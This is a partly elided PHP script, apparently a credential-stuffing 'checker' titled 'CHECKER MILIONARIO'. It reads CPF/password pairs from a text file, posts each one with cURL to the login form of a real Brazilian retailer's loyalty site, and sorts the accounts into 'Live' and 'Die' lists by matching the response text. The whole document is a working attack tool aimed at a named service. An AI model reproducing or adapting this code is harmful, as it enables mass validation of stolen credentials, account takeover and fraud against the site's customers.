...
class cURL {
	...
	//	curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        ...
        if ($method == 'POST') {
            ...
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'scriptManager=updPrincipal%7CbtnEntrarLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUIOTAwNTU1ODNkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBRRjaGtMZW1icmFyRGFkb3NMb2dpbsMbDvkhjW81sYbebltIcNsvRCArxruIyr3uEheC%2FSNz&__VIEWSTATEGENERATOR=2D116C1A&__EVENTVALIDATION=%2FwEdAAVtAx0hxQ%2BVX5enGeN16388K0O2IFjV%2FNEV8JbtBv9ptKDReYypG76gZBcYRtnXvVOAGVOIf8meWPEOsvj2Y3yCbIRYcjVz1Kv4nPTyIVCOWOlJmFaUPJtbN0hFv1iWswGUdKDZacQnalArF7IPJq5a&txtCPFLogin='.$email.'&txtSenhaLogin='.$pwd.'&__ASYNCPOST=true&btnEntrarLogin=%C2%A0');
        }
      $data = curl_exec($ch);
        curl_close($ch);
        if ($data) {
...
<head><title>CHECKER MILIONARIO</title></head>
<style>
			body
		{
...
<center><h1>CHECKER MILIONARIO</h1></center>
<form method="post">
...
if(file_exists(getcwd().'/PAIMENTEZ.txt')) {
	...
	//$a = new cURL();
   // $b = $a->get("https://www.paodeacucarmais.com.br/iframe/ModalLogin.aspx");
    //$token = getStr($b,'captcha_response="','"');
	$c = new cURL();
    //$d = $c->post("https://www.paodeacucarmais.com.br/iframe/ModalLogin.aspx");
	$d = $c->post("https://www.paodeacucarmais.com.br/iframe/LoginDireita.aspx");
...
$checked++;
	...
	if($d){
		...
		if (stristr($d,'CPF ou senha inv') !== false) {
			...
			$cc4 = getStr($d,'"job":',',');
			$cc5 = str_replace(' \r\n','',$cc4);
			$xyz = "<b style=\"color:gred\">Die</b> =>  <b style=\"color:white\" >$email</b> | <b style=\"color:white\">$pwd<b/>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypalDie($xyz);
				...
				pushPaypal("<b style=\"color:green\">Live</b> => | $email<b> | $pwd ");
